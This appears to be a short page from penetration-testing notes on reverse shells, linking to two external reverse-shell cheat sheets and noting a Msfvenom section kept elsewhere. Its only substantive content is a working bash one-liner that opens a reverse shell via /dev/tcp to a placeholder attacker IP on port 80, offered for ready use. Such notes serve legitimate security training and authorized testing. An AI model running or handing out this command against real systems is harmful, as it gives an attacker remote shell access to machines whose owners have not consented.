# Reverse-shells



This is s great collection of different types of reverse shells and webshells.
https://highon.coffee/blog/reverse-shell-cheat-sheet/

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Msfvenom

There is more info on this topic in the metasploit chapter in /exploiting. But here goes


## bash
```
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
```